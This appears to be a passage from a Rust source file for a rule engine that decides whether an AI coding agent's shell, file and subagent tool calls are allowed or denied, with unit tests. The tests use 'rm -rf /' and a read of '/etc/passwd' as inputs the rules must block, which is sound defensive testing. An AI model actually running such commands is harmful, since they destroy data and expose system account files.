use crate::config::{Action, AuditConfig, AuditLevel, Config, RuleConfig};
use crate::shell_parser::{parse_commands, ParsedCommand};
use anyhow::{bail, Result};
use chrono::Utc;
use log::debug;
use regex::Regex;
use serde_json::json;
use std::collections::HashSet;
use std::io::Write;
use std::path::Path;

const MAX_WRAPPER_DEPTH: usize = 5;

#[derive(Debug, Clone, PartialEq)]
pub enum Decision {
    Allow,
    Deny,
    Passthrough,
    ForcePassthrough,
}

impl Decision {
    /// Merge two decisions: deny > force_passthrough > passthrough > allow
    pub fn merge(self, other: Decision) -> Decision {
        match (&self, &other) {
            (Decision::Deny, _) | (_, Decision::Deny) => Decision::Deny,
            (Decision::ForcePassthrough, _) | (_, Decision::ForcePassthrough) => Decision::ForcePassthrough,
            (Decision::Passthrough, _) | (_, Decision::Passthrough) => Decision::Passthrough,
            _ => Decision::Allow,
        }
    }
}

pub struct EvalContext<'a> {
    pub tool_name: &'a str,
    pub tool_input: &'a serde_json::Value,
    pub check_string: &'a str,
    pub field_name: &'a str,
    pub cwd: &'a Path,
    /// Individual arguments from the parsed command (Bash only; empty for other tools)
    pub args: &'a [String],
    /// Targets of `<` redirections (Bash only; empty for other tools)
    pub redirects_in: &'a [String],
    /// Targets of `>` / `>>` redirections (Bash only; empty for other tools)
    pub redirects_out: &'a [String],
    /// Environment variable strings ("VAR=value"): inline prefix assignments for Bash
    /// commands combined with the system environment. System env only for other tools.
    pub env_vars: &'a [String],
}

#[derive(Debug)]
pub struct EvalResult {
    pub decision: Decision,
    pub reason: Option<String>,
    pub table: Option<String>,
    pub rule_index: Option<usize>,
    pub source: String,
}

/// Evaluate a tool invocation against the config and return the final decision.
pub fn evaluate(
    config: &Config,
    tool_name: &str,
    tool_input: &serde_json::Value,
    cwd: &Path,
) -> Result<EvalResult> {
    let entry = &config.global.entry_table;
    // Collect system environment once per evaluation as "VAR=value" strings
    let sys_env: Vec<String> = std::env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect();

    if tool_name == "Bash" {
        evaluate_bash(config, tool_name, tool_input, cwd, entry, &sys_env)
    } else {
        evaluate_non_bash(config, tool_name, tool_input, cwd, entry, &sys_env)
    }
}

/// For Bash: decompose command string, evaluate each sub-command, merge decisions
fn evaluate_bash(
    config: &Config,
    tool_name: &str,
    tool_input: &serde_json::Value,
    cwd: &Path,
    entry_table: &str,
    sys_env: &[String],
) -> Result<EvalResult> {
    let command = tool_input
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("");

    if command.is_empty() {
        return Ok(EvalResult {
            decision: Decision::Passthrough,
            reason: Some("Empty command".to_string()),
            table: None,
            rule_index: None,
            source: "global".to_string(),
        });
    }

    let parsed = parse_commands(command, cwd);

    if parsed.is_empty() {
        return Ok(EvalResult {
            decision: Decision::Passthrough,
            reason: Some("No commands parsed".to_string()),
            table: None,
            rule_index: None,
            source: "global".to_string(),
        });
    }

    let result = evaluate_parsed_commands(
        config, tool_name, tool_input, &parsed, entry_table, sys_env, 0,
    )?;

    Ok(result.unwrap_or(EvalResult {
        decision: Decision::Passthrough,
        reason: Some("No commands parsed".to_string()),
        table: None,
        rule_index: None,
        source: "global".to_string(),
    }))
}

/// Evaluate a list of parsed commands against a table, merging decisions.
/// Called from evaluate_bash and recursively from evaluate_table (for Evaluate action).
fn evaluate_parsed_commands(
    config: &Config,
    tool_name: &str,
    tool_input: &serde_json::Value,
    commands: &[ParsedCommand],
    table_name: &str,
    sys_env: &[String],
    depth: usize,
) -> Result<Option<EvalResult>> {
    let mut final_result: Option<EvalResult> = None;

    for cmd in commands {
        let check = cmd.check_string();
        let mut env_vars = sys_env.to_vec();
        env_vars.extend(cmd.env_vars.iter().cloned());
        let ctx = EvalContext {
            tool_name,
            tool_input,
            check_string: &check,
            field_name: "command",
            cwd: &cmd.effective_cwd,
            args: &cmd.args,
            redirects_in: &cmd.redirects_in,
            redirects_out: &cmd.redirects_out,
            env_vars: &env_vars,
        };

        let mut visited = HashSet::new();
        let result = evaluate_table_inner(
            config, table_name, &ctx, &mut visited, sys_env, depth,
        )?;

        audit(&config.audit, tool_name, "command", &check, &cmd.effective_cwd, &result);

        final_result = Some(merge_results(final_result, result));

        if final_result.as_ref().unwrap().decision == Decision::Deny {
            break;
        }
    }

    Ok(final_result)
}

/// For non-Bash tools: evaluate each matchable field, merge decisions
fn evaluate_non_bash(
    config: &Config,
    tool_name: &str,
    tool_input: &serde_json::Value,
    cwd: &Path,
    entry_table: &str,
    sys_env: &[String],
) -> Result<EvalResult> {
    // Fields to check per tool
    let fields: &[&str] = match tool_name {
        "Read" | "Write" | "Edit" | "MultiEdit" | "Glob" => &["file_path"],
        "Task" => &["subagent_type", "prompt"],
        _ => &[],
    };

    if fields.is_empty() {
        // Unknown tool: just check with empty check_string against tool name
        let ctx = EvalContext {
            tool_name,
            tool_input,
            check_string: tool_name,
            field_name: "tool",
            cwd,
            args: &[],
            redirects_in: &[],
            redirects_out: &[],
            env_vars: sys_env,
        };
        let mut visited = HashSet::new();
        let result = evaluate_table_inner(config, entry_table, &ctx, &mut visited, sys_env, 0)?;
        audit(&config.audit, tool_name, "tool", tool_name, cwd, &result);
        return Ok(result);
    }

    let mut final_result: Option<EvalResult> = None;

    for &field in fields {
        let value = tool_input
            .get(field)
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let ctx = EvalContext {
            tool_name,
            tool_input,
            check_string: value,
            field_name: field,
            cwd,
            args: &[],
            redirects_in: &[],
            redirects_out: &[],
            env_vars: sys_env,
        };

        let mut visited = HashSet::new();
        let result = evaluate_table_inner(config, entry_table, &ctx, &mut visited, sys_env, 0)?;

        audit(&config.audit, tool_name, field, value, cwd, &result);

        final_result = Some(merge_results(final_result, result));

        if final_result.as_ref().unwrap().decision == Decision::Deny {
            break;
        }
    }

    Ok(final_result.unwrap_or(EvalResult {
        decision: Decision::Passthrough,
        reason: Some("No fields evaluated".to_string()),
        table: None,
        rule_index: None,
        source: "global".to_string(),
    }))
}

/// Merge an accumulated result with a new one. Deny > ForcePassthrough > Passthrough > Allow.
/// The stricter result wins; on first call (acc = None), returns new directly.
fn merge_results(acc: Option<EvalResult>, new: EvalResult) -> EvalResult {
    let acc = match acc {
        None => return new,
        Some(a) => a,
    };
    let merged_decision = acc.decision.clone().merge(new.decision.clone());
    let winner = if merged_decision == new.decision { new } else { acc };
    EvalResult {
        decision: merged_decision,
        ..winner
    }
}

/// Public wrapper for tests — evaluates without wrapper depth tracking.
pub fn evaluate_table(
    config: &Config,
    table_name: &str,
    ctx: &EvalContext,
    visited: &mut HashSet<String>,
) -> Result<EvalResult> {
    evaluate_table_inner(config, table_name, ctx, visited, &[], 0)
}

/// Evaluate a single check_string against a table, following forwards with cycle detection.
/// Handles Evaluate action by extracting subcommands and recursively evaluating them.
fn evaluate_table_inner(
    config: &Config,
    table_name: &str,
    ctx: &EvalContext,
    visited: &mut HashSet<String>,
    sys_env: &[String],
    depth: usize,
) -> Result<EvalResult> {
    if visited.contains(table_name) {
        bail!("Cycle detected: table '{}' already visited", table_name);
    }
    visited.insert(table_name.to_string());

    let table = match config.table.get(table_name) {
        Some(t) => t,
        None => bail!("Table '{}' not found", table_name),
    };

    let cache = &config.regex_cache;
    for (i, rule) in table.rules.iter().enumerate() {
        if !matches_rule(rule, ctx, cache)? {
            continue;
        }

        debug!(
            "Rule {} in table '{}' matched: {:?}",
            i, table_name, rule.action
        );

        match &rule.action {
            Action::Allow => {
                return Ok(EvalResult {
                    decision: Decision::Allow,
                    reason: rule.reason.clone(),
                    table: Some(table_name.to_string()),
                    rule_index: Some(i),
                    source: "global".to_string(),
                });
            }
            Action::Deny => {
                return Ok(EvalResult {
                    decision: Decision::Deny,
                    reason: rule
                        .reason
                        .clone()
                        .or_else(|| Some(format!("Denied by rule {} in table '{}'", i, table_name))),
                    table: Some(table_name.to_string()),
                    rule_index: Some(i),
                    source: "global".to_string(),
                });
            }
            Action::Passthrough => {
                return Ok(EvalResult {
                    decision: Decision::Passthrough,
                    reason: rule.reason.clone(),
                    table: Some(table_name.to_string()),
                    rule_index: Some(i),
                    source: "global".to_string(),
                });
            }
            Action::ForcePassthrough => {
                return Ok(EvalResult {
                    decision: Decision::ForcePassthrough,
                    reason: rule.reason.clone(),
                    table: Some(table_name.to_string()),
                    rule_index: Some(i),
                    source: "global".to_string(),
                });
            }
            Action::Forward => {
                let target = rule.target.as_deref().unwrap_or("");
                debug!("Forwarding to table '{}'", target);
                return evaluate_table_inner(config, target, ctx, visited, sys_env, depth);
            }
            Action::Evaluate => {
                if depth >= MAX_WRAPPER_DEPTH {
                    return Ok(EvalResult {
                        decision: Decision::Deny,
                        reason: Some("Maximum wrapper depth exceeded".to_string()),
                        table: Some(table_name.to_string()),
                        rule_index: Some(i),
                        source: "global".to_string(),
                    });
                }
                if let Some(subcmd) = extract_subcommand_from_rule(rule, ctx)? {
                    let target = rule
                        .target
                        .as_deref()
                        .unwrap_or(&config.global.entry_table);
                    debug!("Evaluate: extracted '{}', target table '{}'", subcmd, target);
                    let sub_parsed = parse_commands(&subcmd, ctx.cwd);
                    if let Some(sub_result) = evaluate_parsed_commands(
                        config,
                        ctx.tool_name,
                        ctx.tool_input,
                        &sub_parsed,
                        target,
                        sys_env,
                        depth + 1,
                    )? {
                        return Ok(sub_result);
                    }
                }
                // No subcommand extracted or empty parse — fall through to next rule
            }
        }
    }

    // No rule matched — use table default
    let decision = match table.default {
        Action::Allow => Decision::Allow,
        Action::Deny => Decision::Deny,
        Action::Passthrough => Decision::Passthrough,
        Action::ForcePassthrough => Decision::ForcePassthrough,
        Action::Forward | Action::Evaluate => {
            bail!(
                "Table '{}' has '{:?}' as default — not allowed",
                table_name,
                table.default
            )
        }
    };

    Ok(EvalResult {
        decision,
        reason: Some(format!("Default action in table '{}'", table_name)),
        table: Some(table_name.to_string()),
        rule_index: None,
        source: "global".to_string(),
    })
}

/// Check if a relative path exists, searching from `start_dir` up to the nearest git root.
fn has_file_exists(relative_path: &str, start_dir: &Path) -> bool {
    let mut dir = start_dir.to_path_buf();
    loop {
        if dir.join(relative_path).exists() {
            return true;
        }
        if dir.join(".git").exists() {
            return false;
        }
        if !dir.pop() {
            return false;
        }
    }
}

/// Check if a rule matches the current context
fn matches_rule(rule: &RuleConfig, ctx: &EvalContext, cache: &crate::config::RegexCache) -> Result<bool> {
    // Check tool pattern
    if let Some(tool_pattern) = &rule.tool {
        if !regex_matches(tool_pattern, ctx.tool_name, cache)? {
            return Ok(false);
        }
    }

    // Check cwd pattern — cross-cutting, applies regardless of field
    if let Some(cwd_pattern) = &rule.cwd {
        let cwd_str = ctx.cwd.to_string_lossy();
        if !regex_matches(cwd_pattern, &cwd_str, cache)? {
            return Ok(false);
        }
    }
    if let Some(cwd_not_pattern) = &rule.cwd_not {
        let cwd_str = ctx.cwd.to_string_lossy();
        if regex_matches(cwd_not_pattern, &cwd_str, cache)? {
            return Ok(false);
        }
    }

    // Check arg pattern — satisfied if any individual argument matches
    if let Some(arg_pattern) = &rule.arg {
        let any_matches = ctx
            .args
            .iter()
            .any(|a| regex_matches(arg_pattern, a, cache).unwrap_or(false));
        if !any_matches {
            return Ok(false);
        }
    }
    // Exception: rule does NOT fire if any argument matches arg_not
    if let Some(arg_not_pattern) = &rule.arg_not {
        let any_matches = ctx
            .args
            .iter()
            .any(|a| regex_matches(arg_not_pattern, a, cache).unwrap_or(false));
        if any_matches {
            return Ok(false);
        }
    }

    // Check stdin pattern — satisfied if any `<` redirect target matches
    if let Some(stdin_pattern) = &rule.stdin {
        let any_matches = ctx
            .redirects_in
            .iter()
            .any(|t| regex_matches(stdin_pattern, t, cache).unwrap_or(false));
        if !any_matches {
            return Ok(false);
        }
    }
    if let Some(stdin_not_pattern) = &rule.stdin_not {
        let any_matches = ctx
            .redirects_in
            .iter()
            .any(|t| regex_matches(stdin_not_pattern, t, cache).unwrap_or(false));
        if any_matches {
            return Ok(false);
        }
    }

    // Check stdout pattern — satisfied if any `>` / `>>` redirect target matches
    if let Some(stdout_pattern) = &rule.stdout {
        let any_matches = ctx
            .redirects_out
            .iter()
            .any(|t| regex_matches(stdout_pattern, t, cache).unwrap_or(false));
        if !any_matches {
            return Ok(false);
        }
    }
    if let Some(stdout_not_pattern) = &rule.stdout_not {
        let any_matches = ctx
            .redirects_out
            .iter()
            .any(|t| regex_matches(stdout_not_pattern, t, cache).unwrap_or(false));
        if any_matches {
            return Ok(false);
        }
    }

    // Check env pattern — matches against "VAR=value" strings (inline + system env)
    if let Some(env_pattern) = &rule.env {
        let any_matches = ctx
            .env_vars
            .iter()
            .any(|e| regex_matches(env_pattern, e, cache).unwrap_or(false));
        if !any_matches {
            return Ok(false);
        }
    }
    if let Some(env_not_pattern) = &rule.env_not {
        let any_matches = ctx
            .env_vars
            .iter()
            .any(|e| regex_matches(env_not_pattern, e, cache).unwrap_or(false));
        if any_matches {
            return Ok(false);
        }
    }

    // Check has_file — relative path must exist (searched from cwd up to git root)
    if let Some(path) = &rule.has_file {
        if !has_file_exists(path, ctx.cwd) {
            return Ok(false);
        }
    }
    if let Some(path) = &rule.has_file_not {
        if has_file_exists(path, ctx.cwd) {
            return Ok(false);
        }
    }

    // Check field-specific patterns based on the context's field_name
    match ctx.field_name {
        "command" => {
            if let Some(pattern) = &rule.command {
                if !regex_matches(pattern, ctx.check_string, cache)? {
                    return Ok(false);
                }
            }
        }
        "file_path" => {
            if let Some(pattern) = &rule.file_path {
                if !regex_matches(pattern, ctx.check_string, cache)? {
                    return Ok(false);
                }
            }
        }
        "subagent_type" => {
            if let Some(pattern) = &rule.subagent_type {
                if !regex_matches(pattern, ctx.check_string, cache)? {
                    return Ok(false);
                }
            }
        }
        "prompt" => {
            if let Some(pattern) = &rule.prompt {
                if !regex_matches(pattern, ctx.check_string, cache)? {
                    return Ok(false);
                }
            }
        }
        _ => {
            // Unknown field — if rule has any field-specific patterns, skip.
            // (cwd and arg are cross-cutting, already checked above, not counted here)
            if rule.command.is_some()
                || rule.file_path.is_some()
                || rule.subagent_type.is_some()
                || rule.prompt.is_some()
            {
                return Ok(false);
            }
        }
    }

    Ok(true)
}

/// Extract a subcommand from the current eval context using a rule's extraction params.
/// Uses flag_arg mode (find flag, take next arg as shell string) or positional mode
/// (skip flags via opts_with_args and N positional args, join the rest).
fn extract_subcommand_from_rule(rule: &RuleConfig, ctx: &EvalContext) -> Result<Option<String>> {
    let subcommand = if let Some(flag) = &rule.flag_arg {
        // Flag mode: find the flag in args, take the next arg as a shell string
        ctx.args
            .iter()
            .position(|a| a == flag)
            .and_then(|i| ctx.args.get(i + 1).cloned())
    } else {
        // Positional mode: skip flags and N positional args, rest is subcommand
        extract_positional_subcommand(
            ctx.args,
            &rule.opts_with_args,
            rule.positional.unwrap_or(0),
        )
    };

    match subcommand {
        Some(ref s) if !s.is_empty() => Ok(subcommand),
        _ => Ok(None),
    }
}

/// Walk args, skipping flags (and their values for opts_with_args) and N positional args.
/// `--` marks end of options. Returns the remaining args joined as the subcommand string.
fn extract_positional_subcommand(
    args: &[String],
    opts_with_args: &[String],
    skip_count: usize,
) -> Option<String> {
    let mut options_ended = false;
    let mut positionals_seen = 0;
    let mut i = 0;

    while i < args.len() {
        let arg = &args[i];

        // -- marks end of options
        if !options_ended && arg == "--" {
            options_ended = true;
            i += 1;
            continue;
        }

        // Flags (only before --)
        if !options_ended && arg.starts_with('-') && arg.len() > 1 {
            if opts_with_args.iter().any(|o| o == arg) {
                // Flag that consumes the next arg as its value
                i += 2;
            } else {
                // Boolean flag (or unknown flag)
                i += 1;
            }
            continue;
        }

        // Positional arg
        if positionals_seen < skip_count {
            positionals_seen += 1;
            i += 1;
            continue;
        }

        // Subcommand starts here
        let remaining: Vec<&str> = args[i..].iter().map(|s| s.as_str()).collect();
        return Some(remaining.join(" "));
    }

    None
}

fn regex_matches(pattern: &str, value: &str, cache: &crate::config::RegexCache) -> Result<bool> {
    let re = match cache.get(pattern) {
        Some(re) => re,
        None => {
            // Fallback for patterns not in cache (e.g. local rules)
            let re = Regex::new(pattern)
                .map_err(|e| anyhow::anyhow!("Invalid regex '{}': {}", pattern, e))?;
            return Ok(re.is_match(value));
        }
    };
    Ok(re.is_match(value))
}

/// Write audit log entry if configured
fn audit(audit_config: &AuditConfig, tool: &str, field: &str, check: &str, cwd: &Path, result: &EvalResult) {
    let level = &audit_config.audit_level;
    if *level == AuditLevel::Off {
        return;
    }

    let should_log = match level {
        AuditLevel::Off => false,
        AuditLevel::Matched => result.rule_index.is_some(),
        AuditLevel::All => true,
    };

    if !should_log {
        return;
    }

    let audit_file = match &audit_config.audit_file {
        Some(f) => f,
        None => return,
    };

    let decision_str = match &result.decision {
        Decision::Allow => "allow",
        Decision::Deny => "deny",
        Decision::Passthrough => "passthrough",
        Decision::ForcePassthrough => "force_passthrough",
    };

    let entry = json!({
        "timestamp": Utc::now().to_rfc3339(),
        "tool": tool,
        "field": field,
        "check_string": check,
        "cwd": cwd.to_string_lossy(),
        "decision": decision_str,
        "reason": result.reason,
        "table": result.table,
        "rule_index": result.rule_index,
        "source": result.source,
    });

    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(audit_file)
    {
        let _ = writeln!(file, "{}", entry);
    }
}

/// Evaluate a tool invocation, then optionally consult local rules.
///
/// Local rules are only consulted when:
/// 1. `local_rules` is enabled in the global config
/// 2. The global result is plain `Passthrough` (not ForcePassthrough, Allow, or Deny)
/// 3. Local rules are provided
pub fn evaluate_with_local(
    config: &Config,
    tool_name: &str,
    tool_input: &serde_json::Value,
    cwd: &Path,
    local_rules: Option<&crate::local::LocalRuleSet>,
) -> Result<EvalResult> {
    let result = evaluate(config, tool_name, tool_input, cwd)?;

    if config.global.local_rules
        && result.decision == Decision::Passthrough
    {
        if let Some(local) = local_rules {
            if let Some(local_result) = evaluate_local_rules(&config.audit, local, tool_name, tool_input, cwd)? {
                return Ok(local_result);
            }
        }
    }

    Ok(result)
}

fn evaluate_local_rules(
    audit_config: &AuditConfig,
    local: &crate::local::LocalRuleSet,
    tool_name: &str,
    tool_input: &serde_json::Value,
    cwd: &Path,
) -> Result<Option<EvalResult>> {
    let sys_env: Vec<String> = std::env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect();
    let source = local.source_dir.to_string_lossy().to_string();
    let cache = &local.regex_cache;

    if tool_name == "Bash" {
        let command = tool_input.get("command").and_then(|v| v.as_str()).unwrap_or("");
        if command.is_empty() {
            return Ok(None);
        }
        let parsed = crate::shell_parser::parse_commands(command, cwd);
        let mut final_result: Option<EvalResult> = None;
        for cmd in &parsed {
            let check = cmd.check_string();
            let mut env_vars = sys_env.clone();
            env_vars.extend(cmd.env_vars.iter().cloned());
            let ctx = EvalContext {
                tool_name,
                tool_input,
                check_string: &check,
                field_name: "command",
                cwd: &cmd.effective_cwd,
                args: &cmd.args,
                redirects_in: &cmd.redirects_in,
                redirects_out: &cmd.redirects_out,
                env_vars: &env_vars,
            };
            if let Some(result) = evaluate_flat_rules(&local.rules, &ctx, &source, cache)? {
                audit(audit_config, tool_name, "command", &check, &cmd.effective_cwd, &result);
                final_result = Some(merge_results(final_result, result));
                if final_result.as_ref().unwrap().decision == Decision::Deny {
                    break;
                }
            }
        }
        Ok(final_result)
    } else {
        let fields: &[&str] = match tool_name {
            "Read" | "Write" | "Edit" | "MultiEdit" | "Glob" => &["file_path"],
            "Task" => &["subagent_type", "prompt"],
            _ => &[],
        };
        if fields.is_empty() {
            let ctx = EvalContext {
                tool_name,
                tool_input,
                check_string: tool_name,
                field_name: "tool",
                cwd,
                args: &[],
                redirects_in: &[],
                redirects_out: &[],
                env_vars: &sys_env,
            };
            let result = evaluate_flat_rules(&local.rules, &ctx, &source, cache)?;
            if let Some(ref r) = result {
                audit(audit_config, tool_name, "tool", tool_name, cwd, r);
            }
            return Ok(result);
        }
        let mut final_result: Option<EvalResult> = None;
        for &field in fields {
            let value = tool_input.get(field).and_then(|v| v.as_str()).unwrap_or("");
            let ctx = EvalContext {
                tool_name,
                tool_input,
                check_string: value,
                field_name: field,
                cwd,
                args: &[],
                redirects_in: &[],
                redirects_out: &[],
                env_vars: &sys_env,
            };
            if let Some(result) = evaluate_flat_rules(&local.rules, &ctx, &source, cache)? {
                audit(audit_config, tool_name, field, value, cwd, &result);
                final_result = Some(merge_results(final_result, result));
                if final_result.as_ref().unwrap().decision == Decision::Deny {
                    break;
                }
            }
        }
        Ok(final_result)
    }
}

fn evaluate_flat_rules(
    rules: &[RuleConfig],
    ctx: &EvalContext,
    source: &str,
    cache: &crate::config::RegexCache,
) -> Result<Option<EvalResult>> {
    for (i, rule) in rules.iter().enumerate() {
        if !matches_rule(rule, ctx, cache)? {
            continue;
        }
        let decision = match &rule.action {
            Action::Allow => Decision::Allow,
            Action::Deny => Decision::Deny,
            Action::Passthrough => Decision::Passthrough,
            _ => unreachable!("local rules validated to only contain allow/deny/passthrough"),
        };
        return Ok(Some(EvalResult {
            decision,
            reason: rule.reason.clone(),
            table: None,
            rule_index: Some(i),
            source: source.to_string(),
        }));
    }
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Config;
    use pretty_assertions::assert_eq;

    fn make_config(toml: &str) -> Config {
        let mut c: Config = toml::from_str(toml).expect("valid config");
        c.compile_regexes().expect("valid regexes");
        c
    }

    fn bash_input(cmd: &str) -> serde_json::Value {
        serde_json::json!({"command": cmd})
    }

    #[test]
    fn test_simple_allow() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
tool = "Bash"
command = "^ls"
action = "allow"
reason = "ls is safe"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ls -la"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
        assert_eq!(result.reason.as_deref(), Some("ls is safe"));
    }

    #[test]
    fn test_simple_deny() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm"
action = "deny"
reason = "rm is not allowed"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("rm -rf /"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert!(result.reason.as_deref().unwrap().contains("rm is not allowed"));
    }

    #[test]
    fn test_default_deny() {
        let config = make_config(
            r#"
[table.input]
default = "deny"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("some_unknown_command"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_forward_between_tables() {
        let config = make_config(
            r#"
[table.input]
default = "passthrough"

[[table.input.rules]]
tool = "Bash"
action = "forward"
target = "scrutiny"

[table.scrutiny]
default = "deny"

[[table.scrutiny.rules]]
command = "^ls"
action = "allow"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ls /tmp"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_cycle_detection() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
action = "forward"
target = "other"

[table.other]
default = "deny"

[[table.other.rules]]
action = "forward"
target = "input"
"#,
        );

        let ctx = EvalContext {
            tool_name: "Bash",
            tool_input: &bash_input("ls"),
            check_string: "ls",
            field_name: "command",
            cwd: Path::new("/home/user"),
            args: &[],
            redirects_in: &[],
            redirects_out: &[],
            env_vars: &[],
        };
        let mut visited = HashSet::new();
        let result = evaluate_table(&config, "input", &ctx, &mut visited);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Cycle detected"));
    }

    #[test]
    fn test_compound_command_deny_wins() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^ls"
action = "allow"

[[table.input.rules]]
command = "^rm"
action = "deny"
reason = "rm denied"
"#,
        );

        // ls is allowed but rm is denied; deny should win
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ls /tmp && rm -rf /tmp/foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_file_path_rule() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
tool = "Read"
file_path = "^/home/user/dev/.*"
action = "allow"
"#,
        );

        let input = serde_json::json!({"file_path": "/home/user/dev/project/file.rs"});
        let result = evaluate(&config, "Read", &input, Path::new("/home/user")).unwrap();
        assert_eq!(result.decision, Decision::Allow);

        let input2 = serde_json::json!({"file_path": "/etc/passwd"});
        let result2 = evaluate(&config, "Read", &input2, Path::new("/home/user")).unwrap();
        assert_eq!(result2.decision, Decision::Deny);
    }

    #[test]
    fn test_passthrough() {
        let config = make_config(
            r#"
[table.input]
default = "passthrough"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ls"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Passthrough);
    }

    #[test]
    fn test_force_passthrough_decision() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
tool = "Bash"
command = "^ls"
action = "force_passthrough"
reason = "Force passthrough ls"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ls -la"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::ForcePassthrough);
        assert_eq!(result.reason.as_deref(), Some("Force passthrough ls"));
    }

    #[test]
    fn test_tool_pattern_filter() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
tool = "^Read$"
file_path = ".*"
action = "allow"

[[table.input.rules]]
tool = "^Write$"
file_path = ".*"
action = "deny"
reason = "writes denied"
"#,
        );

        let input = serde_json::json!({"file_path": "/tmp/file.txt"});
        let read_result = evaluate(&config, "Read", &input, Path::new("/home/user")).unwrap();
        assert_eq!(read_result.decision, Decision::Allow);

        let write_result = evaluate(&config, "Write", &input, Path::new("/home/user")).unwrap();
        assert_eq!(write_result.decision, Decision::Deny);
    }

    // ── cwd matching ─────────────────────────────────────────────────────────

    #[test]
    fn test_cwd_allows_when_matches() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
action = "allow"
reason = "rm allowed inside /tmp"
"#,
        );

        // cd /tmp && rm foo — rm's effective_cwd is /tmp
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp && rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_cwd_denies_when_mismatches() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
action = "allow"
reason = "rm allowed inside /tmp"
"#,
        );

        // rm from /home/user — cwd doesn't match /tmp, rule skipped, default deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_cwd_subdirectory_matches() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
action = "allow"
"#,
        );

        // cd /tmp/subdir && rm foo — /tmp/subdir matches ^/tmp(/.*)?$
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp/subdir && rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_cwd_and_command_both_required() {
        // Rule requires both command=^rm and cwd=^/tmp — only rm in /tmp passes
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
action = "allow"
"#,
        );

        // ls in /tmp — command doesn't match ^rm, denied
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp && ls"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);

        // rm in /tmp — both match, allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp && rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_cwd_from_initial_cwd() {
        // No cd in command — effective_cwd is the HookInput cwd
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
action = "allow"
"#,
        );

        // Running from /tmp already — rm is allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("rm foo"),
            Path::new("/tmp"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // Running from /home/user — rm is denied
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    // ── arg matching ──────────────────────────────────────────────────────────

    #[test]
    fn test_arg_matches_any_argument() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg = "^https://api\\.github\\.com/"
action = "allow"
reason = "curl to github api allowed"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://api.github.com/repos/foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_arg_allows_with_flags_before_url() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg = "^https://api\\.github\\.com/"
action = "allow"
"#,
        );

        // Flags appear before the URL — arg should still match on the URL arg
        let result = evaluate(
            &config,
            "Bash",
